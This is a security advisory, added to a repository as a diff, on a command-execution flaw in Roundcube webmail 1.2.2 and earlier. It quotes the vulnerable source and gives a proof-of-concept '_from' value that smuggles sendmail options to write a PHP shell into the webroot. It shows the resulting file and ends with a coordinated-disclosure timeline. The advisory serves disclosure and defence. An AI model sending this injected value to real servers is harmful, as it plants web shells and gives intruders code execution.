@@ -1,0 +1,110 @@
+Roundcube 1.2.2: Command Execution via Email
+============================================
+You can find the online version of the advisory here:
+https://blog.ripstech.com/2016/roundcube-command-execution-via-email/
+
+Found by Robin Peraglie with RIPS
+
+Introduction
+------------
+Roundcube is a widely distributed open-source webmail software used by
+many organizations and companies around the globe. The mirror on
+SourceForge, for example, counts more than 260,000 downloads in the last
+12 months which is only a small fraction of the actual users. Once
+Roundcube is installed on a server, it provides a web interface for
+authenticated users to send and receive emails with their web browser.
+
+Affected Versions: 1.0.0 - 1.2.2
+
+Requirements
+------------
+- Roundcube must be configured to use PHP's mail() function (by default)
+- PHP's mail() function is configured to use sendmail (by default)
+- PHP is configured to have safe_mode turned off (by default)
+- An attacker must know or guess the absolute path of the webroot
+
+Description
+-----------
+In Roundcube 1.2.2, and earlier, user-controlled input flows unsanitized
+into the fifth argument of a call to PHP's built-in function mail()
+which is documented as security critical. The problem is that the
+invocation of the mail() function will cause PHP to execute the sendmail
+program. The fifth argument allows to pass arguments to this execution
+which allows a configuration of sendmail. Since sendmail offers the -X
+option to log all mail traffic in a file, an attacker can abuse this
+option and spawn a malicious PHP file in the webroot directory of the
+attacked server. The following code lines trigger the vulnerability.
+
+program/steps/mail/sendmail.inc
+********************************************************************************
+$from = rcube_utils::get_input_value('_from', rcube_utils::INPUT_POST,
+true, $message_charset);
+⋮	
+$sent = $RCMAIL->deliver_message($MAIL_MIME, $from, $mailto,$smtp_error,
+$mailbody_file, $smtp_opts);
+********************************************************************************
+
+Here, the value of the POST parameter "_from" is fetched and Roundcube's
+deliver_message() method is invoked with the value used as second
+argument $from.
+
+program/lib/Roundcube/rcube.php
+********************************************************************************
+public function deliver_message(&$message, $from, $mailto, &$error,
+&$body_file = null, $options = null) {
+	⋮
+	if (filter_var(ini_get('safe_mode'), FILTER_VALIDATE_BOOLEAN))
+		$sent = mail($to, $subject, $msg_body, $header_str);
+	else
+		$sent = mail($to, $subject, $msg_body, $header_str, "-f$from");
+********************************************************************************
+
+This method will then pass the $from parameter to a call of the mail()
+function. The idea is to pass a custom "from" header to the sendmail
+program via the "-f" option.
+
+Proof of Concept
+----------------
+When an email is sent with Roundcube, the HTTP request can be
+intercepted and altered. Here, the "_from" parameter can be modified in
+order to place a malicious PHP file on the system.
+
+********************************************************************************
+example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php
+********************************************************************************
+
+This allows an attacker to spawn a shell file "rce.php" in the web root
+directory with the contents of the "_subject" parameter that can contain
+PHP code. After performing the request, a file with the following
+content is created:
+
+********************************************************************************
+04731 >>> Recipient names must be specified
+04731 <<< To: squinty@localhost
+04731 <<< Subject: <?php phpinfo(); ?>
+04731 <<< X-PHP-Originating-Script: 1000:rcube.php
+04731 <<< MIME-Version: 1.0
+04731 <<< Content-Type: text/plain; charset=US-ASCII;
+04731 <<<  format=flowed
+04731 <<< Content-Transfer-Encoding: 7bit
+04731 <<< Date: So, 20 Nov 2016 04:02:52 +0100
+04731 <<< From: example@example.com -OQueueDirectory=/tmp
+04731 <<<  -X/var/www/html/rce.php
+04731 <<< Message-ID: <390a0c6379024872a7f0310cdea24900@localhost>
+04731 <<< X-Sender: example@example.com -OQueueDirectory=/tmp
+04731 <<<  -X/var/www/html/rce.php
+04731 <<< User-Agent: Roundcube Webmail/1.2.2
+04731 <<<
+04731 <<< Funny e-mail message
+04731 <<< [EOF]
+********************************************************************************
+
+Since the email data is unencoded, the subject parameter will be
+reflected in plaintext which allows the injection of PHP tags into the
+shell file.
+
+Time Line
+---------
+* 2016/11/21: First contact with vendor
+* 2016/11/28: Vendor agrees to coordinated disclosure
+* 2016/11/28: Vendor releases updated version Roundcube 1.2.3
